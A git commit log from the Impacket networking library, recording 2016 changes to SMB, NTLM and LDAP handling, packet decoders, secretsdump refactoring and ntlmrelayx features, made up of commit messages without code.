    Adding -csv switch to output format in CSV
    
    * Partially addresses https://github.com/CoreSecurity/impacket/issues/237

commit bf745b0e34124dabb5d1e7a4752160721fc2b06f
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 10 14:58:26 2016 -0300

    Adding PasswordLastSet, USER_DONT_EXPIRE_PASSWORD, USER_ACCOUNT_DISABLED and ScriptPath attributes
    
    * Partially addresses https://github.com/CoreSecurity/impacket/issues/237

commit bf0ecc6ff893c3fe8e84d0d87f9e58e7c2b806d3
Merge: 2681d1f5 268a79a6
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 10 12:01:47 2016 -0300

    Merge branch 'contactr2m-master'

commit 268a79a6de8c4c0913520793422e65dbd28611b3
Merge: 18e90dcc 6a21c7ea
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 14:01:35 2016 -0500

    Merge pull request #2 from contactr2m/#238-test_createdeleteDirectory
    
    Covers test for #238

commit 6a21c7eae2e5d099a4625e0456cc859ad75f23ed
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 13:45:56 2016 -0500

    Covers test for #238
    
    Test case test_createdeleteDirectory extended to include #238 case.

commit 18e90dcc26c317a742d66edb1ab52d8a7c53a89c
Merge: 2681d1f5 6750aae4
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 09:56:39 2016 -0500

    Merge pull request #1 from contactr2m/smb3.rmdir
    
    Implement SMB2_FILE_DISPOSITION_INFO in SMB3.rmdir() method.

commit 6750aae49067d063bc386f1c26fe7a6f538b7936
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 09:52:23 2016 -0500

    Implement SMB2_FILE_DISPOSITION_INFO in SMB3.rmdir() method.
    
    Right now SMB3.rmdir() does not throw error STATUS_DIRECTORY_NOT_EMPTY when directory to be deleted is not empty.
    Instead it silently continues and returns success.
    Note that if the DELETE_ON_CLOSE flag is specified on a directory with child files or directories, the create operation will succeed, but the delete on close flag will be silently ignored when processing the cleanup IRP and the directory will not be deleted. http://go.microsoft.com/fwlink/?LinkId=140636

commit 2681d1f5de5c6122883a947bc57d431071f0beb5
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 6 12:53:34 2016 -0300

    Parse domain_name and TargetInfoFields based on their offsets and not after the Version field
    
    * This applies to NTLMAuthChallenge.
    * According to [MS-NLMP], Version field: 'A VERSION structure (as defined in section 2.2.2.10) that is populated only when the NTLMSSP_NEGOTIATE_VERSION flag is set in the NegotiateFlags field. This structure is used for debugging purposes only. In normal (non-debugging) protocol messages, it is ignored and does not affect the NTLM message processing.'
    * We found an instance of a server *not* setting the NTLMSSP_NEGOTIATE_VERSION and still having 8 bytes of random data as part of the version field.
    * At the same time [MS-NLMP] also states that: 'The Version field is NOT sent or accessed by Windows NT or Windows 2000. Windows NT and Windows 2000 assume that the Payload field started immediately after TargetInfoBufferOffset. Since all references into the Payload field are by offset from the start of the message (not from the start of the Payload field), Windows NT and Windows 2000 can correctly interpret messages with Version fields.'
    * Hence, we're using the offsets from now on to reference domain_name and TargetInfoFields
    * This should address https://github.com/CoreSecurity/impacket/issues/235

commit 2b61eedc6e2f58da8000faf3d49585273d02eade
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 5 18:32:16 2016 -0300

    Initializing self._Connection['Dialect'] to integer
    
    * Instead of ''. Dialects are numbers in SMB > 2 world.
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/233

commit a446089a3f3dcac393dcfdd2e0b0a71a420ed9be
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 5 09:37:48 2016 -0300

    Don't count on CreditCharge to calculate SequenceWindow, when dialect is SMB 2.0.2
    
    * This should address https://github.com/CoreSecurity/impacket/issues/233, pending testing from the original
    reporter

commit a298662c7bc7afcf342839968d92a0e00e015ae3
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 2 11:36:53 2016 -0300

    Don't send a SMB2_NEGOTIATE packet if we already know the server's chosen dialect
    
    * Only sends it again if we receive a SMB2_DIALECT_WILDCARD dialect.
    * This hopefuly addresses the situation where the target server supports a single SMB2+ dialect so it doesn't need to return SMB2_DIALECT_WILDCARD. I think this would only happen for those SMB Servers that only support SMB2_DIALECT_002 (not entirely sure tho).
    * This should address a part of https://github.com/CoreSecurity/impacket/issues/233.

commit 38f7bac1fcb3a91eb3571566ea1ffca6d518fbc7
Merge: 563b757f 72f3a7c9
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 24 14:11:44 2016 -0300

    Merge branch 'fox-it-ntlmrelayx'

commit 72f3a7c974f8e4868a07908c3b2bdafd1ec6ea84
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Nov 23 15:39:51 2016 +0100

    ntlmrelayx - relaying to IMAP

commit 563b757fba3af32655941edf5a35343300b173b2
Merge: 990e80b0 ab584ee8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 21 13:25:11 2016 -0300

    Merge pull request #231 from fox-it/ntlmrelayx
    
    Fix ntlmrelayx httprelayclient to support HTTPS urls

commit ab584ee81df86d17027f2d429b732205fd934793
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Nov 21 17:01:35 2016 +0100

    Fix httpclient to support HTTPS urls

commit 990e80b065688002de8ffb0b977a4bffd304c003
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 16 14:13:59 2016 -0300

    When processing a WCHAR_ARRAY, add support for unichr()
    
    * In case we find Unicode chars
    * Might help solving https://github.com/CoreSecurity/impacket/issues/154

commit 2bc68df37e5689deb2c46c9d47c37011c49e714d
Merge: 07e2377c 43dde14f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Nov 16 12:42:52 2016 -0300

    Merge pull request #229 from fox-it/ntlmrelayx
    
    Ntlmrelayx bugfixes

commit 43dde14fd126b615516fd13956f66bd18500f4c4
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Nov 16 16:40:11 2016 +0100

    ntlmrelayx compatibility with ldap3 v2 and newer

commit 0da9b84f9f8935271b35a0e12e1d04b868e55ae4
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Nov 16 13:06:16 2016 +0100

    LDAP attack improvements

commit 07e2377c790da8180ecafd1bdff9cb735d6c0a6c
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 24 21:42:16 2016 -0300

    Adding -user-status support for DRSUAPI mode
    
    * Completes what was done at https://github.com/CoreSecurity/impacket/pull/222

commit 6c44e5bdd4dd3299c8966de6a7b57e019ccca1fd
Merge: d62efb7c 036e5bd7
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 24 21:21:07 2016 -0300

    Merge branch 'shab4z-master'

commit 036e5bd77852eb2b4152eb463eddc5e2b2bfd11d
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 24 21:19:24 2016 -0300

    Adding a -user-status display option
    
    * Changing the (current-disabled) to (status=Enabled/Disabled)
    * Moving that data to the end of the line, in alignment to the pwd-last-set display option
    * Only supportted in VSS mode. DRSUAPI coming soon

commit 5aab86a05918cbcbf8fcd5204a11e425693e0e52
Author: Slim MERIAH <smeriah@lexsi.com>
Date:   Mon Oct 24 13:52:24 2016 +0200

    Little check for enabled/disabled users.

commit d62efb7c8c87c9393caf33877e1cd9d21732e5f5
Merge: 2485f164 9c94160f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Oct 20 16:18:30 2016 -0300

    Merge pull request #220 from the-useless-one/ldap_utf8
    
    Don't try to encode the LDAP filter if it's already in unicode

commit 2485f164fd67ebf957df7082f4ad50f5018c807d
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 19 13:34:43 2016 -0300

    Fixes anonymous connection flags.
    
    * We shouldn't specify we're sending username / password when we're not.

commit 8cef002928ca52be4e9476a87a54d836b5efa81e
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 18 15:22:21 2016 -0300

    Adding MQTT basic structures and example
    
    * Minimalistic MQTT implementation, just focused on connecting, subscribing and publishing
      basic messages on topics.
    * Simple MQTT example aimed at playing with different login options. Can be converted into
      a account/password brute forcer quite easily.

commit 9c94160fac1c2547aa92e8553efe89247999a5a8
Author: Yannick Méheut <yannick@meheut.org>
Date:   Wed Oct 12 11:50:49 2016 +0200

    If the ldap filter is already in UTF8, leave it as is

commit f35117e184438e747c0ba372ea3ef8f41d9a5d73
Merge: 10b94e4e 40e64714
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 7 10:11:02 2016 -0300

    Merge branch 'fox-it-ntlmrelayx-interactive'

commit 40e6471434f849fcbab769a668a8ff5cb45fa068
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Thu Oct 6 22:33:12 2016 +0200

    Added interactive SMB console via local socket

commit 13843229ab90236742124330c72fd931cb5d06b8
Merge: 9739ade5 10b94e4e
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Thu Oct 6 19:15:29 2016 +0200

    Merge branch 'master' of github.com:CoreSecurity/impacket into ntlmrelayx-interactive

commit 10b94e4e20570a168e2e60c9b91e3a454de69a23
Merge: 0afacbea dadc4ebc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 5 11:19:09 2016 -0300

    Merge pull request #218 from Gifts/master
    
    Small fixes for NTLMRelayX http client module

commit dadc4ebc227f1ad976730bbe3dbbab6dda2437e1
Author: Gifts <giftsungiv3n@gmail.com>
Date:   Wed Oct 5 16:52:27 2016 +0300

    Fix parsing NTLM challenge when multiple WWW-Authenticate headers are sent

commit f5a59ac408c683409a1db6ded51c3b92dafc338e
Author: Gifts <giftsungiv3n@gmail.com>
Date:   Wed Oct 5 16:29:35 2016 +0300

    Fix paths with multiple "/" in them

commit 0afacbea5a13f3bf5fb9e860ab3d3c712ef8a315
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 4 19:58:43 2016 -0300

    Adding GetADUsers.py example script
    
    This script will gather data about the domain's users and their corresponding email addresses. It will also
    include some extra information about last logon and last password set attributes.
    You can enable or disable the the attributes shown in the final table by changing the values in line 184 and
    headers in line 190.
    If no entries are returned that means users don't have email addresses specified.

commit c1e5842c2105490a5c9f763a700cd4b8e87274ec
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 4 16:04:51 2016 -0300

    Fixes NTLM anonymous issue authentication against W2k3
    
    * It might solve https://github.com/CoreSecurity/impacket/issues/216, although not sure yet since I cannot reproduce the full issue (I still get ACCESS_DENIED after anonymous login)

commit 9739ade5747018b45a9ffe425374d8d620fa4dde
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Mon Oct 3 21:26:00 2016 +0200

    Some more leftovers

commit 8af1ed5715756cfbd2ec6b81c12e1b87dc7b524b
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Mon Oct 3 21:22:38 2016 +0200

    Fix legacy config inconsistencies

commit f9652789d405557c782a1fd7c31add6b526c5c7d
Merge: bcd75b08 42165dde
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 21 20:06:10 2016 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit bcd75b080edcbf090ac95e8b96d73d4f2d52dd7f
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 21 20:04:33 2016 -0300

    Attempting to address situations where TSO (TCP segmentation offload) is present
    
    * I'm not entirely sure this is the right approach to solve this use case. Testing needed.

commit 42165ddee85832810ff3fc282ac8aa4560b0e3a5
Merge: 0c8e7926 66e28da7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 21 15:23:54 2016 -0300

    Merge pull request #209 from blark/master
    
    Update ntlmrelayx.py to fix domain dump bug

commit 66e28da76f4c022e518ffc3274d2969a05e998ee
Author: blark <info@baseggio.ca>
Date:   Wed Sep 21 14:22:29 2016 -0400

    Update ntlmrelayx.py to fix domain dump bug
    
    The boolean `dumpedDomain` was being assigned after the completion of a domain dump. This can take quite some time on a large domain, meaning that every time a new request is processed the domain dump starts again (until the first dump is finished). This minor tweak should fix that.

commit 0c8e7926d1474f18d653cad543ded6917cd37394
Merge: 52279744 81ffe50c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 21 15:21:18 2016 -0300

    Merge pull request #208 from blark/master
    
    Updated requirements section

commit 81ffe50cbecf64c165fb8a264dec2cb2420578ae
Author: blark <info@baseggio.ca>
Date:   Wed Sep 21 14:17:13 2016 -0400

    Updated requirements section
    
    Added ntlmrelayx requirements and tweaked lines to match style

commit 52279744e8bf9c5895fc3339dc8fa4541840f45b
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 21 11:13:53 2016 -0300

    Fixing typo with PCAP MAGIC and Structure

commit 0e68c7ecc37c7b702168db75fcf6f1f041ca9e43
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 20:11:15 2016 -0300

    Honoring SMBConnection.myName parameter when doing NTLM handshake
    
    * If you create a SMBConnection object and specify a myName parameter, it will be populated in the NTLM_AUTH_MESSAGE
    * However, it will NOT be sent in the NTLM_NEGOTIATE message since modern Windows clients don't populated that information.
    * DCERPC connection are not yet supported
    * Partially addresses https://github.com/CoreSecurity/impacket/issues/207

commit d2cbe3c2606bd16e628858baae6483e8dd48ed3c
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 14:40:30 2016 -0300

    Adding code to handle IGMP packet
    
    * Applying patch from @nixotic
    * Addresses https://github.com/CoreSecurity/impacket/issues/30

commit bc05ee3522af7854400b00df40d421a0838a9a59
Merge: 7694e67a db8d2914
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 14:28:20 2016 -0300

    Merge branch 'xelphene-master'

commit db8d291490e77685dd7abcd06f4b99dbf5c0feb9
Merge: 7694e67a 8dbf234b
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 14:25:14 2016 -0300

    Merge branch 'master' of https://github.com/xelphene/impacket into xelphene-master

commit 7694e67a9fab4de3cfb13b6924718d69af8e2979
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 10:26:11 2016 -0300

    Minor cosmetic changes

commit 42b447229fe9ed887d91d75df17c57f422963e24
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 09:55:16 2016 -0300

    Checking password field is not None when calling getNTLMSSPType3
    
    * If so, we convert it to '', hoping hashes were provided.
    * Indirectly addresses https://github.com/CoreSecurity/impacket/issues/206

commit 8dbf234ba38030e2914379015db743ac828a2bb3
Merge: 0de3c24e c049506e
Author: Steve Benson <steve@xelphene.net>
Date:   Fri Sep 16 00:11:12 2016 -0400

    Merge https://github.com/CoreSecurity/impacket
    
    Conflicts:
            examples/wmiexec.py

commit 0de3c24e058c36a2db8173da94be3af88f0fdfca
Author: Steve Benson <steve@xelphene.net>
Date:   Wed Sep 14 06:59:48 2016 -0400

    Added a -A option to load credentials from an smbclient/mount.cifs style
    authentication file.

commit c049506e43ffa4c76dca7c676822ada7182f8288
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 13 23:54:50 2016 -0300

    Minor cosmetic changes

commit 01b0ae8e936ec4ead94fbd55d739603fd6f46f34
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 13 23:15:23 2016 -0300

    Better error control
    
    * We should re-write ServiceInstall tho.. It's kind of messy

commit d103ea7d0e50c7096d4f038d90d9162e302636b4
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 13 22:06:12 2016 -0300

    Removing uneccesary imports

commit a483bfbca950e1b205543fd28452b0cc5e68bb2c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 12:00:31 2016 -0300

    Printing NTLM hashes as we get them and we keep the rest to the end
    
    * Basically NTLM Hashes printed as they come
    * Kerberos keys and cleartext password as printed after the NTLM hashes
    * Aimed at making the output more readable

commit d2e4aacf477387a2a3efb4ee359aecf79505e1ee
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:32:39 2016 -0300

    Adjusting variables to the naming convention already used

commit 473f3f107582347fd4df82d736ad68e5d71c88e6
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:17:57 2016 -0300

    Importing classes from the library instead of the example
    
    * In case the example's not present

commit e79b5e26cf387e94a50c1d51c9a65b5e11895870
Merge: 3e194c65 372b7e25
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:06:28 2016 -0300

    Merge branch 'martinuy-secrets_dump_refactoring'

commit 372b7e25749464785f2488c1a41323c30d0e3893
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:04:22 2016 -0300

    No need to convert argument to string
    
    * In fact it might trigger an exception when dealing with Unicode strings (e.g. an user with non ASCII chars)

commit b4c819b99f758419f13884a72d6ad15c96b9c1f3
Merge: 3e194c65 8701c37b
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 10:41:12 2016 -0300

    Merge branch 'secrets_dump_refactoring' of https://github.com/martinuy/impacket into martinuy-secrets_dump_refactoring

commit 8701c37bb09e491e2264ad3664be367dd4cedb3d
Author: martin_uy <m@rtin.uy>
Date:   Fri Sep 9 10:22:24 2016 -0300

    Resources cleanup (files closing) when dumping NTDS hashes.

commit 1ca14b97f478789ea2405946022fab6f9bd31f5a
Author: martin_uy <m@rtin.uy>
Date:   Fri Sep 9 10:12:44 2016 -0300

    Constant replacement.

commit 5819161f6846d3cbd8295d81373f014bd1b0ab84
Author: martin_uy <m@rtin.uy>
Date:   Thu Sep 8 21:10:18 2016 -0300

    A callback per secret was added to extract information out of Secrets Dump library component. A "print" default callback keeps the previous behaviour by default.

commit 3e194c6540d41f7d231e0de28f305572cae541f7
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 8 11:52:00 2016 -0300

    Removing references to deprecated SMBBackwardCompatibilityTransport class
    
    * Fixes https://github.com/CoreSecurity/impacket/issues/203

commit 87dd64e4da23ee9af838ef181f591b2309003ede
Author: martin_uy <m@rtin.uy>
Date:   Thu Sep 8 11:09:49 2016 -0300

    Secrets Dump library component is now using the Impacket's logging idiom.

commit 3d4944afc76a145643595d4f825e247ed8ee0ba8
Author: martin_uy <m@rtin.uy>
Date:   Wed Sep 7 20:45:48 2016 -0300

    Secrets Dump example split into 2 components. Secrets extraction component moved to Impacket library as an example. Command line interface component remains out of Impacket library.

commit c8aabf2810857032c2f944edfb8ca931ecf3889a
Author: Michael Niewoehner <mniewoeh@stud.hs-offenburg.de>
Date:   Thu Sep 17 15:52:12 2015 +0200

    Adding Decoders for BOOTP and DHCP

commit 2a4195d416aa67771bbe27aec629076bfe1e0253
Merge: 609ddf3e 488fddd1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 7 12:54:20 2016 -0300

    Merge pull request #89 from DiGMi/master
    
    Adding ERP and Country elements to Beacon

commit 609ddf3e5626ec32e42ba8826ed4bb8b7d7955a3
Merge: ce72d09c a934c89e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 7 12:51:55 2016 -0300

    Merge pull request #91 from c0d3z3r0/feature/eap
    
    Add EAPOLDecoder to EthDecoder

commit ce72d09cbce787839584b2566cf9d6323048872e
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 6 17:49:00 2016 -0300

    Minor class refactor
    
    * Created LocalOperations class to encapsulate some offline registry specific operations.
    * Now DumpSecrets is cleaner, and just handles the instances created based on the scripts parameters set by the user

commit bac6ad7f50ffe894d64055b4fc1eeff48051b059
Merge: 7801e11d 3221e344
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 6 12:27:42 2016 -0300

    Merge pull request #202 from fox-it/ntlmrelay-fixes
    
    ntlmrelayx improvements

commit 3221e34440e2ab09f46baa3005f1c923a66983f0
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Sep 6 16:50:11 2016 +0200

    ntlmrelayx improvements

commit 7801e11d9906e105f0ec369cf0fe88f5d131afc5
Merge: af697dcf 0325289b
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 5 12:27:44 2016 -0300

    Merge branch 'kacpern-ldap-dev'

commit 0325289b45feb28d7cbc21324dda14945c202c27
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Mon Sep 5 17:24:09 2016 +1000

    changed default classes to a mixin

commit df5b231da10ff84a506905d442256e987d7103ef
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Mon Sep 5 15:16:38 2016 +1000

    minor changes and refactoring
    * slightly changed search method definition
    * added pretty printing of control values

commit a934c89ea2badc89f8c5e5175a49e6e199cf36a6
Author: Michael Niewoehner <mniewoeh@stud.hs-offenburg.de>
Date:   Wed Sep 16 10:21:16 2015 +0200

    Add EAPOLDecoder to EthDecoder to get the decoded EAPOL packet from child()

commit d63ff2368791e415aca73922174b9a762157c32c
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Fri Sep 2 10:42:21 2016 +1000

    reverted str.format() to %s
    reverted str.decode() to unhexlify()
    fixed my primitive obsession
    additional refactoring

commit 7799329097a2b825ca75e3ebe4223ce74c9a4478
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Sep 1 15:13:10 2016 +1000

    formatting fix

commit da8c405e008a358aa6514bd317602b5f1dc7bc63
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Sep 1 15:00:15 2016 +1000

    rudimentary checks for simple authentication

commit c652c0f7a733861784bd6cfbd90d9deebaa7e999
Merge: 8aba596b af697dcf
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Sep 1 14:26:52 2016 +1000

    Merge branch 'master' into ldap-dev

commit 8aba596bf329e87a7260deafec012dc2fdcad77f
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 31 16:13:49 2016 +1000

    working on ldap and ldapasn1 cleanup

commit af697dcf9550684f05f6ea50037910a825c8bc10
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 29 11:57:31 2016 -0300

    Avoiding infinite loop when opening some ESE databases
    
    * We're giving up if FirstAvailablePageTag is <=1 (as opposed to just == 1)
    * Fixes https://github.com/CoreSecurity/impacket/issues/199

commit db125046eda94f75051a28ef83fce24b5ca98bd5
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 25 21:32:51 2016 -0300

    Adding Author Attribution
    
    * Based on the amount of code committed on those files.

commit 6ecaa8a7bcb065f6f7ffc007e9dda2705aa6baeb
Merge: fc4d2a15 81fe930e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 25 21:13:22 2016 -0300

    Merge pull request #197 from kacpern/ldap-approxmatch
    
    pretty handling of unsolicited notifications

commit 81fe930ea69a237a109268da58e2ef49319ace30
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Fri Aug 26 10:08:34 2016 +1000

    implemented handling of nnsolicited notification

commit fc4d2a15d35cb06a1949f1ce95c01a96f9d289a5
Merge: 311b5ba0 be48469e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 25 21:05:52 2016 -0300

    Merge pull request #196 from kacpern/ldap-approxmatch
    
    fix tagSet for approxMatch (#195)

commit 311b5ba09454098c6a3441aa082e05269ea1ef03
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 25 14:04:51 2016 -0300

    Removing unused imports
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/187

commit be48469e18efa39b8a1b911029bca159aa1b3fca
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:57:44 2016 +1000

    implemented handling of nnsolicited notification

commit b4808fcca418b66395edb830e86492767c06f1bd
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:56:36 2016 +1000

    implemented handling of nnsolicited notification

commit c523e9462932190139d3067d20ba3c9f1959f2ef
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:25:11 2016 +1000

    formatting

commit bed4b2db64e804dbfb14c04169903e48e49a2cbc
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:13:28 2016 +1000

    * fix tagSet for approxMatch (#195)
    * add extendedResult to ldapasn1
    * add fix for AD nonconformity with RFC

commit 8af9271f656b6d420466f8bcaec8b81253388340
Merge: da6086a4 db48476f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 24 09:46:39 2016 -0300

    Merge pull request #194 from kacpern/ldap-paging
    
    changing names

commit db48476f523a2f7509f2736cd16bb564bd4d5663
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 24 16:21:25 2016 +1000

    fixing bad names

commit 3484373aca5fceb2866b1ea455678e04c5b02533
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 24 16:18:30 2016 +1000

    fixing bad names

commit ecccf3b26bfa71ddca6dad6e84beb50866dd4a55
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 24 16:13:40 2016 +1000

    fixing bad names

commit da6086a4a40e7349c36300496d56493ebdff696f
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 23 12:55:50 2016 -0300

    Removing unused code
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/187

commit b8ef63da351cc24e812624e1294d930f89b3578c
Merge: f330e78b 0c9b64a5
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 23 11:48:31 2016 -0300

    Merge branch 'kacpern-ldap-paging'

commit 0c9b64a592ceb01925af1d3cca8a05301724bfac
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:27:21 2016 +1000

    ready to merge. please test. take 2.

commit 402f334984a01d75d07b495afd49335eb453eca6
Merge: f8dd738c bace3f17
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:23:44 2016 +1000

    Merge remote-tracking branch 'origin/ldap-paging' into ldap-paging
    
    # Conflicts:
    #       impacket/ldap/ldap.py

commit f8dd738c9749244d0f37e493cb43641a79f86eb4
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:17:22 2016 +1000

    ready to merge. please test.

commit bace3f176aa10dec567482a8fe5dc877791b0290
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:17:22 2016 +1000

    ready to merge. please test.

commit 4f0bef666ba35ffe1fbf277d5d0b2901a4b1a901
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 22:55:48 2016 +1000

    minor changes

commit 557944359e169c8144e3bfbcaa738baca6692a89
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 17:48:15 2016 +1000

    changed control handling code to accommodate the fact that some controls can have different controlTypes for request and response

commit 090bc35e86d7910f0ebae6209457235de5bf9ef8
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 17:00:33 2016 +1000

    removed unused variable

commit 92e34128669f219269a6b8bb2a1fa7b10af2cade
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 16:24:09 2016 +1000

    fixed broken logic (could have impact if new controls are implemented in the future)

commit 7069281cb7328d2508c8edd178d74d0ff87c18c4
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:50:16 2016 +1000

    fixed a dangling break

commit 34da4acc5a9c9dabbfb7415bb69a76a4a7a59a56
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:48:59 2016 +1000

    removed unneeded enumerate

commit f0c1b016c9b6d4d03a3c1226eefe6606594affcc
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:34:19 2016 +1000

    changed tagFormat in Controls()

commit 50258a8b77f9b68d647c7c7ccaa2715c1c6d9c60
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:26:52 2016 +1000

    removed unused imports

commit 46507c703e95050497cb7938a8392f06d0d31e7d
Merge: c25a8b5b f330e78b
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:25:28 2016 +1000

    Merge branch 'master' into ldap-paging

commit c25a8b5b93047f14945c6f3426b1ebd4b58d801f
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:19:25 2016 +1000

    added simple paging support
    changed defualt search filter to '(objectClass=*)'
    changed decoder to BER
    added extra non-capturing group in NUM_OID
    removed manualFilter in search as _parseFilter should deal with anything now, just use the string version of your filter in the call

commit f330e78bb2f94b503b3a0e887c0b6cbb96489f5b
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 22 09:20:49 2016 -0300

    Adjusting those fields where a default value is predefined
    
    * Also, changing ASN1 encoding from DER to BER
    * Linked to https://github.com/CoreSecurity/impacket/issues/190#issuecomment-241341614 discussions

commit 1630821cae97eb4905b64aa629a0bc0a7ef9b5c2
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Sat Aug 20 14:19:23 2016 +1000

    changing code for consistency

commit cee61cd53298930a43a1ed2e423d9b15826cb28c
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 18 10:04:45 2016 -0300

    Getting rid of manual search filters and using just strings
    
    * Way easier after @kacpern awesome PR!

commit 8ea9ebc2d05d4f76b656fa7a2d60dcd74e15f7dd
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 18 09:56:45 2016 -0300

    Adding manualFilter parameter to LDAPConnection.search() in order to mantain a way to specify directly Filter objects to be used when searching.
    
    * Will make transition easier for those projects used to the former search API.

commit 8efc4a2f7e7196b0c5fe63d996fcbebe290f28df
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 18 17:24:50 2016 +1000

    minor fix in regular expression

commit e2379346a0ddc2a2217c7ef292c7d8dc2cda12e8
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 18 16:40:21 2016 +1000

